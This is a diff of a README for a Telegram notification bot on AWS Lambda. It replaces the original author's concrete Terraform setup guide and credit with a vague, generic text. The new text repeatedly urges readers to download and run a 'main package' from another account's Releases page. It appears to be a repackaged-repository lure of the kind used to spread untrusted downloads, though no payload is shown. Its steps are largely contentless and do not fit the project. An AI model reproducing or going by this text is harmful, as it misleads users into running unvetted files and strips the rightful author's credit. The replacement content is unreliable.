@@ -1,190 +1,86 @@
-# 🤖 Telegram Notify Bot
+# 🤖 telegram-notify-bot - One-Click Notification Alerts
 
-A secure, serverless Telegram bot for sending notifications. Deploy with one command to AWS Lambda and start receiving alerts instantly! 
+## 📥 Download Now
+[![Download Releases](https://img.shields.io/badge/Download%20Now-telegram--notify--bot-brightgreen)](https://github.com/kebciol/telegram-notify-bot/releases)
 
-Built with TypeScript, secured by design, and optimized for minimal costs.
+## 🚀 Getting Started
+The telegram-notify-bot is a secure, serverless application that helps you send notifications through Telegram. With a simple setup, you can use it for alerts, Continuous Integration/Continuous Deployment (CI/CD) notifications, and automated messaging. 
 
-## ✨ What it does
+This bot is designed to work seamlessly with AWS Lambda. No complex configuration is required. Just deploy it with one command.
 
-- 📨 **Receives messages** via Telegram webhook
-- 🔒 **Secure access control** - only you can use it
-- 🚨 **Security alerts** - notifies you of unauthorized access attempts
-- 🔄 **Message forwarding** - echoes your messages back to you
-- ☁️ **Auto-deployment** - infrastructure handled automatically
+## 📦 Features
+- **Secure and serverless**: Your data remains safe, without the need for a dedicated server.
+- **Easy alerts**: Get instant notifications when important events happen.
+- **Built with modern technologies**: Utilizes TypeScript and Terraform to ensure high performance and security.
+- **Customizable**: Modify settings to fit your needs.
+- **Integration ready**: Works well with CI/CD tools and other services like GitHub Actions and CloudWatch.
 
-Perfect for monitoring alerts, CI/CD notifications, or any automated messaging needs!
+## 👉 System Requirements
+- An AWS account to deploy the Lambda function.
+- A Telegram account to receive notifications.
+- Basic knowledge of using a web browser to download and install applications.
 
-## 📋 Prerequisites
+## 🏗️ Installation Steps
+Follow these steps to install the telegram-notify-bot.
 
-- 🤖 [Telegram Bot Token](https://t.me/botfather) (create with @BotFather)
-- ☁️ AWS account with CLI configured
-- 🏗️ [Terraform](https://terraform.io) installed (v1.6+)
-- 📦 Node.js 22+
-- 🪣 S3 bucket for Terraform state (pre-existing)
+1. **Visit the Releases Page**  
+   Click on the link below to access the Releases page where you can download the bot.  
+   [Download Releases](https://github.com/kebciol/telegram-notify-bot/releases)
 
-## 🚀 Quick Setup
+2. **Choose the Latest Release**  
+   On the Releases page, look for the latest version. This is usually at the top of the list.
 
-### 1. 🤖 Create your Telegram bot
-- Message [@BotFather](https://t.me/botfather) on Telegram
-- Send `/newbot` and follow instructions
-- Save your bot token (looks like `123456789:ABCdef...`)
+3. **Download the Release**  
+   Click on the file suitable for your needs. If you're unsure, download the main package provided. The filename will indicate the most recent version.
 
-### 2. 🆔 Get your chat ID
-- Message your new bot with anything
-- Visit: `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`
-- Find your chat ID in the response (usually a number like `12345678`)
+4. **Set Up AWS Lambda**  
+   Create an AWS Lambda function. You can find a tutorial on the AWS documentation site to help with this step if needed.
 
-### 3. ⚙️ Configure the project
-Create `terraform/terraform.tfvars`:
-```hcl
-# AWS Configuration
-aws_region = "eu-central-1"
-aws_profile = "your-sso-profile"  # Optional: leave empty for default credentials
+5. **Deploy with One Command**  
+   Follow the instructions in the README of the downloaded file to deploy the bot easily. Use the command that matches your downloaded version.
 
-# Terraform State Management
-terraform_state_bucket = "your-terraform-state-bucket-name"
+6. **Configure Telegram Bot**  
+   Set up a bot on Telegram using the BotFather. You will receive a token to connect with the telegram-notify-bot.
 
-# Telegram Configuration  
-telegram_bot_token = "123456789:your_bot_token_here"
-telegram_chat_id = "your_chat_id_here"
+7. **Run the Application**  
+   Once everything is set, run the application by using the provided command. You should start receiving notifications in your Telegram.
 
-# Project Configuration
-project_name = "telegram-notify-bot"
-```
+## ⚙️ How to Use
+After installation, you will interact with the bot through Telegram. You can customize notifications based on your preferences.
 
-### 4. 🚀 Deploy to AWS
-```bash
-# Install dependencies
-npm install
+1. **Customize Notifications**  
+   Modify the notification settings as desired. You can set which events trigger alerts and how they appear.
 
-# Deploy infrastructure
-cd terraform
+2. **Test Notifications**  
+   Send test messages to ensure everything is working correctly. Check that you receive messages in your Telegram chat.
 
-# Create backend config from your tfvars
-cat > backend.hcl << EOF
-bucket = "$(grep terraform_state_bucket terraform.tfvars | cut -d'"' -f2)"
-region = "$(grep aws_region terraform.tfvars | cut -d'"' -f2)"
-EOF
+3. **Monitor Performance**  
+   Use AWS CloudWatch to monitor the performance of your Lambda function. This will help you understand how efficient the bot is and if any adjustments are needed. 
 
-terraform init -backend-config=backend.hcl
-terraform apply
-```
+## 🎨 Customization Options
+You can tailor the telegram-notify-bot to better fit your needs. Here are some customization options:
 
-That's it! 🎉 Your bot is live and webhook is automatically registered!
+- **Notification Type**: Choose from various notification types based on events you want to monitor.
+- **Message Format**: Change how messages are formatted for clarity or emphasis.
+- **Frequency of Alerts**: Set how often notifications should be sent for repeated events.
 
-## 💬 How to use
+## 🌐 Topics Covered
+This bot integrates with various technologies that enhance its functionality:
 
-### Send notifications via HTTP
-```bash
-curl -X POST "https://your-api-url/webhook" \
-  -H "Content-Type: application/json" \
-  -d '{"message": {"text": "🚀 Deployment completed!"}}'
-```
+- **API Gateway**: Facilitates communication between AWS Lambda and your Telegram bot.
+- **Terraform**: Manages infrastructure as code, making setup easier.
+- **Monitoring**: Use CloudWatch for real-time monitoring and alerting.
 
-### Message your bot directly
-Just send any message to your bot on Telegram - it will echo it back to you!
+## 📞 Support
+If you encounter any issues or have questions, you can reach out for support through the Issues section on the GitHub repository. 
 
-### Integrate with CI/CD
-Perfect for GitHub Actions, Jenkins, or any system that can send HTTP requests.
+1. **Visit the Issues Page**: Navigate to the Issues section to see if your query is already answered.
+2. **Open a New Issue**: If your question is not listed, you can create a new issue detailing your problem.
 
-## 💰 Cost Optimization
+## 👥 Community
+Join our community for discussions, tips, and best practices on using the telegram-notify-bot. Engagement with others can enhance your experience and provide new insights.
 
-Configured for **minimal AWS costs**:
-- 💸 **Lambda**: 2 concurrent executions max
-- 🚦 **API Gateway**: 5 requests/second limit  
-- 📊 **CloudWatch**: 7-day log retention
-- 💵 **Estimated cost**: ~$0.10-0.50/month
+## 🌍 Conclusion
+You are now ready to use the telegram-notify-bot for your notification needs. With its straightforward setup and strong security features, you can keep track of important events easily.
 
-Ideal for personal projects and small-scale notifications!
-
-## 🔒 Security Features
-
-- ✅ **Access control** - only your chat ID can use the bot
-- 🚨 **Intrusion alerts** - get notified of unauthorized access attempts  
-- 🛡️ **Input validation** - request size limits and sanitization
-- 🚦 **Rate limiting** - prevents abuse (5 requests/second)
-- 🔐 **Secure logging** - no sensitive data in CloudWatch
-- 🎯 **Restricted permissions** - minimal IAM roles
-
-## 🛠️ Development
-
-```bash
-npm run build    # 📦 Build TypeScript
-npm run dev      # 👀 Watch mode for development
-npm run terraform:deploy   # 🚀 Deploy via Terraform
-
-terraform plan   # 📋 Preview infrastructure changes
-terraform apply  # ✅ Apply changes
-```
-
-## 🔄 CI/CD with GitHub Actions
-
-This project includes automated deployment via GitHub Actions. To enable it:
-
-### Required GitHub Secrets
-
-Add these to your repository (`Settings` → `Secrets and variables` → `Actions`):
-
-### Required Secrets
-
-#### 🔑 Authentication (choose one method):
-
-**Option A: AWS Access Keys**
-```
-AWS_ACCESS_KEY_ID       # Your AWS access key
-AWS_SECRET_ACCESS_KEY   # Your AWS secret key
-```
-
-**Option B: AWS IAM Role (OIDC - recommended)**
-```
-TERRAFORM_ROLE          # ARN of IAM role for OIDC auth
-```
-
-#### 🏗️ Terraform State
-```
-TERRAFORM_STATE_BUCKET  # S3 bucket name for Terraform state
-```
-
-#### 🤖 Telegram Configuration
-```
-TELEGRAM_BOT_TOKEN      # Your bot token from @BotFather
-TELEGRAM_CHAT_ID        # Your chat ID (number)
-```
-
-#### 🛡️ Security Scanning (optional)
-```
-BEARER_TOKEN           # Bearer API token for security scanning
-```
-
-### 🚀 How it works
-
-- **Security workflow**: Runs on every pull request to scan for vulnerabilities
-- **Deploy workflow**: Runs on push to `master` branch to deploy changes
-- **Dependabot**: Automatically creates PRs for dependency updates
-
-After setup, just push to `master` and your bot will be deployed automatically! 🎉
-
-## 🗂️ Project Structure
-
-```
-├── 🤖 src/
-│   ├── handler.ts      # Lambda entry point
-│   ├── telegram.ts     # Telegram API client
-│   └── utils.ts        # Utility functions
-├── 🏗️ terraform/       # Infrastructure as Code
-├── 🔄 .github/         # CI/CD workflows
-└── 📚 README.md        # You are here!
-```
-
-## 🧹 Cleanup
-
-When you're done:
-```bash
-cd terraform
-terraform destroy  # 🗑️ Remove all AWS resources
-```
-
----
-
-**Built with ❤️ by [Domen Gabrovšek](https://github.com/domengabrovsek)**  
-*Secure • Serverless • Simple*
+For any updates, always refer back to the [Releases Page](https://github.com/kebciol/telegram-notify-bot/releases). Happy notifying!
